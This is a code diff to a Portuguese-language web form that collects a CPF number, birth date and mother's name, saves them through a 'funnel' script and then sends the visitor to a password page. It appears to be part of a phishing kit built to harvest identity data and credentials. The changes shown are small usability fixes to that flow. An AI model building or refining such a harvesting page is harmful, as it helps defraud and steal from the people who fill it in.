@@ -8,9 +8,6 @@
     <script src="assets/js/ref-guard.js"></script>
     <script src="assets/js/tailwind.js"></script>
     <link href="assets/css/inter.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <script src="assets/js/imask.js"></script>
     <script src="assets/js/funnel.js"></script>
     <style>
@@ -67,6 +64,16 @@
                 if (saved.nascimento) nascInput.value = saved.nascimento;
                 if (saved.mae) maeInput.value = saved.mae;
 
+                function resetFormState() {
+                    const btn = document.getElementById('btnConfirmar');
+                    if (btn) {
+                        btn.disabled = false;
+                        btn.innerText = 'CONTINUAR';
+                    }
+                }
+
+                window.addEventListener('pageshow', resetFormState);
+
                 document.getElementById('formConfirmacao').addEventListener('submit', async function(e) {
                     e.preventDefault();
                     
@@ -86,7 +93,7 @@
                     };
 
                     sessionStorage.setItem("dados_cpf", JSON.stringify(dadosConfirmacao));
-                    await saveFunnelData('confirmacao', dadosConfirmacao);
+                    saveFunnelData('confirmacao', dadosConfirmacao);
 
                     // Próxima etapa do funil: SENHA
                     navTo('senha.html');
